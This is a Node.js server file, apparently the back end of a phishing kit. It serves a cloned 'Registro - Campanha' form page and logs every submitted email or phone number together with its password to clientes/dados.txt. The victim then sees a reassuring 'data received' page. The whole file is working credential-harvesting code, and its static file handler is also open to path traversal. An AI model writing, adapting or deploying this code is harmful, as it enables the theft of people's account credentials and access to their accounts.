const http = require('http');
const fs = require('fs');
const path = require('path');

const CLIENTES_DIR = path.join(__dirname, 'clientes');
if (!fs.existsSync(CLIENTES_DIR)) fs.mkdirSync(CLIENTES_DIR);

const PORT = process.env.PORT || 3000;
const BASE_DIR = __dirname;

const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.css':  'text/css',
    '.js':   'application/javascript',
    '.png':  'image/png',
    '.jpg':  'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif':  'image/gif',
    '.svg':  'image/svg+xml',
    '.ico':  'image/x-icon',
    '.download': 'application/javascript',
    '':      'application/octet-stream',
};

function serveFile(res, filePath) {
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end('Arquivo não encontrado: ' + filePath);
            return;
        }
        const ext = path.extname(filePath).toLowerCase();
        const mime = MIME[ext] || MIME[''];
        res.writeHead(200, { 'Content-Type': mime });
        res.end(data);
    });
}

function parseBody(req, callback) {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => callback(body));
}

function decodeForm(body) {
    const result = {};
    body.split('&').forEach(pair => {
        const [key, val] = pair.split('=');
        if (key) result[decodeURIComponent(key)] = decodeURIComponent((val || '').replace(/\+/g, ' '));
    });
    return result;
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const reqUrl = decodeURIComponent(req.url);

    // Rota principal — serve o HTML do formulário
    if (req.method === 'GET' && (reqUrl === '/' || reqUrl === '/index')) {
        serveFile(res, path.join(BASE_DIR, 'Registro - Campanha.html'));
        return;
    }

    // Arquivos estáticos (CSS, imagens, JS)
    if (req.method === 'GET') {
        const filePath = path.join(BASE_DIR, reqUrl);
        if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
            serveFile(res, filePath);
            return;
        }
    }

    // Recebe os dados do formulário
    if (req.method === 'POST' && reqUrl === '/submit') {
        parseBody(req, body => {
            const data = decodeForm(body);
            const numero = data['Email'] || '(não informado)';
            const senha  = data['Password'] || '(não informado)';
            const agora  = new Date().toLocaleString('pt-BR');

            // Salva em clientes/dados.txt
            const linha = `[${agora}] Numero: ${numero} | Senha: ${senha}\n`;
            fs.appendFile(path.join(CLIENTES_DIR, 'dados.txt'), linha, err => {
                if (err) console.error('Erro ao salvar:', err);
            });

            console.log(`\n[${agora}] Novo envio salvo em clientes/dados.txt`);

            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dados Recebidos</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a0a0a 0%, #3d0b0b 40%, #1c1c2e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: #fff; padding: 48px 56px; border-radius: 14px; text-align: center; box-shadow: 0 6px 30px rgba(0,0,0,0.3); max-width: 420px; width: 90%; }
    .icon { font-size: 64px; line-height: 1; }
    h2 { color: #222; margin: 18px 0 8px; font-size: 22px; }
    p { color: #666; font-size: 15px; margin-top: 8px; }
    .btn { display: inline-block; margin-top: 32px; padding: 11px 28px; background: #c0392b; color: #fff; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 14px; }
    .btn:hover { background: #a93226; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">✅</div>
    <h2>Dados Recebidos!</h2>
    <p>Suas informações foram enviadas com sucesso.</p>
    <a class="btn" href="/">← Voltar</a>
  </div>
</body>
</html>`);
        });
        return;
    }

    res.writeHead(404);
    res.end('Não encontrado');
});

server.listen(PORT, () => {
    console.log(`\n✅ Servidor rodando em http://localhost:${PORT}`);
    console.log('   Acesse o link acima para abrir o formulário.\n');
});
